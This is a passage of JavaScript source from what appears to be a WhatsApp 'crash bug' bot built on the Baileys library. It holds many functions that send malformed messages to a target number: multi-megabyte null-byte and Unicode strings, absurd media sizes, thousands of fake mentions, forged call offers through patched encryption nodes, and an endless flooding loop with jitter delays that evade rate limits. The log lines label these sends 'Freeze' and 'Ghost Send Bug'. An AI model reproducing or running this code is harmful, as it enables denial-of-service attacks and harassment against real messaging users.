                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/Xatanicvxii",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function ZhTCore(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "HKXSAQdSyKgkkF2/OpqvJsl7dkvtnp23HerOIjF9/fM=",
          fileLength: "999999999999999",
          height: 99999,
          width: 99999,
          mediaKey: "TGuDwazegPDnxyAcLsiXSvrvcbzYpQ0b6iqPdqGx808=",
          fileEncSha256: "hRGms7zMrcNR9LAAD3+eUy4QsgFV58gm9nCHaAYYu88=",
          directPath: "/o1/v/t24/f2/m269/AQMJjQwOm3Kcds2cgtYhlnxV6tEHgRwA_Y3DLuq0kadTrJVphyFsH1bfbWJT2hbB1KNEpwsB_oIJ5qWFMC8zi3Hkv-c_vucPyIAtvnxiHg?ccb=9-4&oh=01_Q5Aa2QFabafbeTby9nODc8XnkNnUEkk-crsso4FfGOwoRuAjuw&oe=68CD54F7&_nc_sid=e6ed6c",
          mediaKeyTimestamp: "1755695348",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
                mediaKeyTimestamp: Math.floor(Date.now() / 1000).toString(),
                contactVcard: true,
                thumbnailDirectPath: `/v/t62.36145-24/${Math.floor(Math.random() * 1e18)}_${Math.floor(Math.random() * 1e18)}_n.enc?ccb=11-4&oh=${Math.random().toString(36).substring(2, 15)}&oe=${Math.random().toString(36).substring(2, 10)}&_nc_sid=${Math.random().toString(36).substring(2, 6)}`,
                thumbnailSha256: Buffer.from(crypto.randomBytes(32)).toString("base64"),
                thumbnailEncSha256: Buffer.from(crypto.randomBytes(32)).toString("base64"),
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
                thumbnailHeight: Math.floor(Math.random() * 1080),
                thumbnailWidth: Math.floor(Math.random() * 1920)
              },
              hasMediaAttachment: true
            },
            body: {
              text: "Cycsix Blank "
            },
            urlTrackingMap: {
              urlTrackingMapElements: [
                {
                  originalUrl: "https://t.me/Xatanicvxii",
                  unconsentedUsersUrl: "https://t.me/Xatanicvxii",
                  consentedUsersUrl: "https://t.me/Xatanicvxii",
                  cardIndex: 1
                },
                {
                  originalUrl: "https://t.me/Xatanicvxii",
                  unconsentedUsersUrl: "https://t.me/Xatanicvxii",
                  consentedUsersUrl: "https://t.me/Xatanicvxii",
                  cardIndex: 2
                }
              ]
            },
            nativeFlowMessage: {
              buttons: [
                { 
                  name: "single_select", 
                  buttonParamsJson: "X" 
                },
                { 
                  name: "galaxy_message", 
                  buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
                },
                { 
                  name: "call_permission_message", 
                  buttonParamsJson: "\x10".repeat(10000)
                }
              ],
              messageParamsJson:
                "Cycsix Blank" +
                "\u0000".repeat(900000)
            },
            contextInfo: {
              mentionedJid: [
                "6285215587438@s.whatsapp.net",
                ...Array.from({ length: 20 }, () => `1${Math.floor(Math.random() * 500000)}@lid`)
              ],
              forwardingScore: 999999,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: { 
                conversation: " X " 
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  });
}

async function CarouselBlank(sock, target) {
  const Carousel = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "𞋯",
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "⎋",
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: false,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "𞋯" + "ꦾ".repeat(15000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "{\"title\":\"carouselBug\\>𞋯\",\"sections\":[{\"title\":\"ϟ\",\"rows\":[]}]}",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"️DOCUMENT\",\"flow_id\":\"CAROUSEL\",\"flow_message_version\":\"9\",\"flow_token\":\"CAROUSEL\"}"
              }
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(Carousel), { userJid: target });
  try {
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.error("Error :", err);
  }
}

async function ZhTVocaloid(sock, target, mention) {
  try {
    const ZhTxRizzMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
              fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
              mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
              mimetype: "application/was",
              height: 9999999999,
              width: 999999999,
              directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
              fileLength: 9999999,
              pngThumbnail: Buffer.alloc(0),
              mediaKeyTimestamp: 1757601173,
              isAnimated: true,
              stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
              isAvatar: false,
              isAiSticker: false,
              isLottie: false
          }
        }
      }
    };

    await Promise.all([
      sock.relayMessage(target, ZhTxRizzMsg.viewOnceMessage.message, {
        messageId: "",
        participant: { jid: target },
        userJid: target
      })
    ]);

    let ZhTxRizzMsg2 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "~",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "payment_info",
                paramsJson: "\u0000".repeat(1045000),
          version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background:
          "#" +
          Math.floor(Math.random() * 16777215)
            .toString(16)
            .padStart(6, "0")
      }
    );

    await sock.relayMessage("status@broadcast", ZhTxRizzMsg2.message, {
      messageId: ZhTxRizzMsg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (ZhTxRizzMsg2) {
      await sock.relayMessage(
        target,
        {
          groupStatusMentionMessageV2: {
            message: {
              protocolMessage: {
                key: ZhTxRizzMsg2.key,
                type: 25
              }
            }
          }
        },
        {}
      );
    }
  } catch (e) {
    console.error(e);
  }
}

async function ForceSqlVc(target){
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(CobaIni);
    let yntkts = sock.encodeWAMessage?.bind(CobaIni);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(target => ({ recipientJid: target, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(target, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        target,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(Ril.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };
    
    await sock.sendNode(callNode);
}

async function ghostluc(sock, target, mention) {
await privatedelay();
  let ConnectMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Order Now Bro"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
                  buttonParamsJson: `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0${"\u0000".repeat(100000)}}`
                }
              ]
            }
          }
        }
      }
    }),
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Order Now",
          orderTitle: "Click Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 3000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      },
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    ConnectMsg.message.viewOnceMessage.message,
    {
      messageId: ConnectMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ConnectMsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true },
          },
        ],
      }
    );
  }

  console.log(chalk.red(`Ghost Send Bug ${target}`));
}

async function CupofLove(sock, target, mention = true) {
  const sticker = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: true
    }
  };

  const msgSticker = generateWAMessageFromContent(
    "status@broadcast",
    { ephemeralMessage: { message: sticker, ephemeralExpiration: 259200 } },
    { userJid: sock.user?.id }
  );

  await sock.relayMessage("status@broadcast", msgSticker.message, {
    messageId: msgSticker.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });

  while (true) {
    const image = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/d/f/Z9Y8X7W6V5U4T3S2R1Q0.jpg?ccb=11-4",
        mimetype: "image/jpeg",
        fileSha256: "h8O0mH7mY2H0p0J8m4wq2EoX5J2mP2z9S3oG3y1b2nQ=",
        fileEncSha256: "Vgkq2c2c1m3Y8F0s7f8c3m9V1a2b3c4d5e6f7g8h9i0=",
        mediaKey: "4n0Ck3yVb6b4T2h1u8V7s6Q5p4O3i2K1l0M9n8B7v6A=",
        fileLength: 245781,
        directPath: "",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [2437, 17332],
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
            )
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      { ephemeralMessage: { message: { viewOnceMessage: { message: image } }, ephemeralExpiration: 259200 } },
      { userJid: sock.user?.id }
    );

    const interactiveMsg = generateWAMessageFromContent(
      "status@broadcast",
      { 
        ephemeralMessage: { 
          message: { 
            viewOnceMessage: { 
              message: {
                interactiveResponseMessage: {
                  body: { text: "" },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(500000),
                    version: 3
                  }
                }
              }
            } 
          }, 
          ephemeralExpiration: 259200 
        } 
      },
      { userJid: sock.user?.id }
    );

    const paymentMsg = generateWAMessageFromContent(
      "status@broadcast",
      { 
        ephemeralMessage: { 
          message: { 
            viewOnceMessage: { 
              message: {
                interactiveResponseMessage: {
                  body: { text: "" },
                  nativeFlowResponseMessage: {
                    name: "payment_info",
                    paramsJson: "\u0000".repeat(500000),
                    version: 3
                  }
                }
              }
            } 
          }, 
          ephemeralExpiration: 259200 
        } 
      },
      { userJid: sock.user?.id }
    );

    await Promise.all([
      sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }
            ]
          }
        ]
      }),
      sock.relayMessage("status@broadcast", interactiveMsg.message, {
        messageId: interactiveMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }
            ]
          }
        ]
      }),
      sock.relayMessage("status@broadcast", paymentMsg.message, {
        messageId: paymentMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
              }
            ]
          }
        ]
      })
    ]);

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(500000) },
              content: undefined
            }
          ]
        }
      );
    }
  }
}

async function Focav(sock, target) {
    const Msg = generateWAMessageFromContent(X, {
        extendedTextMessage: {
            text: "<" + "ꦽ".repeat(9999),
            matchedText: "https://Wa.me/stickerpack/1",
            canonicalUrl: "https://Wa.me/stickerpack/1",
            description: "Boombogie",
            title: ".",
            previewType: 0,
            jpegThumbnail: Buffer.alloc(0),
            contextInfo: {
                mentionedJid: [
                    target,
                    ...Array.from({ length: 50 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                ],
                remoteJid: "X",
                participant: X,
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: Date.now() + 1814400000
                    }
                },
                externalAdReply: {
                    title: "Send Now",
                    body: "Join Now",
                    thumbnailUrl: "https://Wa.me/stickerpack/1",
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    sourceUrl: "https://Wa.me/stickerpack/1"
                }
            }
        }
    }, {});

    await sock.relayMessage(target, Msg.message, { participant: { jid: target }, messageId: Msg.key.id });
    console.log(chalk.red(`Delay Freeze Send Bug ${target}`));
}

async function CzFrozen(sock, X) {
await privatedelay();
  await sock.relayMessage(X, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "[Xyz]",
          contentText: "Kamu Suka Permen?" + "ꦽ".repeat(7000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true,
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/xatanicvxii",
                    unconsentedUsersUrl: "https://t.me/xatanicvxii",
                    consentedUsersUrl: "https://wa.me/1$",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://wa.me/1$",
                    unconsentedUsersUrl: "https://wa.me/stickerPack",
                    consentedUsersUrl: "https://wa.me/stickerPack",
                    cardIndex: 2,
                  },
                ],
              },            
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "Join Now",
                  format: ".groupmenu"
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\".menu\",\"tower_number\":\".menu\",\"city\":\"NewYork\",\"name\":\"fucker\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
                  version: 3
                }
              }
            }
          },
          headerType: 1
        }
      }
    }
  }, {});
}

async function privatedelay(index = 0) {
  const baseDelay = 3500;
  const stepIncrease = 500;
  const maxDelay = 25500;
  const batchSize = 15;
  const batchIndex = Math.floor(index / batchSize);
  let finalDelay = baseDelay + (batchIndex * stepIncrease);
  if (finalDelay > maxDelay) finalDelay = maxDelay;
  const jitter = Math.floor(Math.random() * 300) + 100;
  finalDelay += jitter;
  await new Promise(res => setTimeout(res, finalDelay));

  if ((index + 1) % 60 === 0) {
    const longDelay = 2 * 60 * 1000;
    await new Promise(res => setTimeout(res, longDelay));
  }
}

async function XDelay(target) {
  await privatedelay();

  const msg = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 20000 },
            (_, y) => `1313555000${y + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "—˙",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson:
            `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"medan\",\"name\":\"xxx\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    },
    { userJid: target }
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target, "13135550002@s.whatsapp.net"],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function Localoid(sock, target, mention) {
await privatedelay();
  try {
    const ZhTxRizzMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
              fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
              mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
              mimetype: "application/was",
              height: 9999999999,
              width: 999999999,
              directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
              fileLength: 9999999,
              pngThumbnail: Buffer.alloc(0),
              mediaKeyTimestamp: 1757601173,
              isAnimated: true,
              stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
              isAvatar: false,
              isAiSticker: false,
              isLottie: false
          }
        }
      }
    };

    await Promise.all([
      sock.relayMessage(target, ZhTxRizzMsg.viewOnceMessage.message, {
        messageId: "",
        participant: { jid: X },
        userJid: X
      })
    ]);

    let ZhTxRizzMsg2 = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "~",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "payment_info",
                paramsJson: "\u0000".repeat(1045000),
          version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
